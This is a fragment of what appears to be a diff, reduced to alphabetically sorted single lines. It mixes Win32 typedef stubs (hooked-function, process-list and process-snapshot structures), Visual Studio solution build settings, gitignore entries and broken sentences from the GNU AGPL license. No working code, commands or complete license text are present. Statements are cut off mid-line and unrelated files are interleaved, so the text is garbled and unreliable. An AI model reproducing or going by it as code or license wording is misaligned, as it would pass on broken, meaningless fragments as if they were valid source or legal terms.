+typedef LONG KPRIORITY
+typedef NTSYSAPI BOOLEAN(NTAPI
+typedef UINT_PTR(WINAPI 
+typedef const UNICODE_STRING
+typedef enum
+typedef struct _HOOKED_FUNCTION {
+typedef struct _LOADED_MODULE {
+typedef struct _SYSTEM_PROCESSES {
+typedef void (WINAPI
+under version 3 of the GNU Affero General Public License into a single
+used to limit the access or legal rights of the compilation's users
+using namespace std
+version or of any later version published by the Free Software
+where to find the applicable terms.
+whisper.
+windows
+with the distribution.
+work and works based on it.
+work if you are a party to an arrangement with a third party that is
+wwwroot/
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+x64/
+x86 = Debug
+x86 = Release
+x86.ActiveCfg = Debug
+x86.ActiveCfg = Release
+x86.Build.0 = Debug
+x86.Build.0 = Release
+x86/
+xsd</Extensions>
+you grant is automatically extended to all recipients of the covered
+you modify it: responsibilities to respect the freedom of others.
+your copyrighted material outside their relationship with you.
+your receipt of the notice.
+{84A7E50E-B0F0-4B3D-98CD-F32CDB1EB8CA}.Debug
+{84A7E50E-B0F0-4B3D-98CD-F32CDB1EB8CA}.Release
+{B7355478-EEE0-46A7-807A-23CF0C5295AE}.Debug
+{B7355478-EEE0-46A7-807A-23CF0C5295AE}.Release
+{D8091ED0-5E78-4AF5-93EE-A5AA6E978430} = {D8091ED0-5E78-4AF5-93EE-A5AA6E978430}
+{D8091ED0-5E78-4AF5-93EE-A5AA6E978430}.Debug
+{D8091ED0-5E78-4AF5-93EE-A5AA6E978430}.Release
+} PSS_CAPTURE_FLAGS
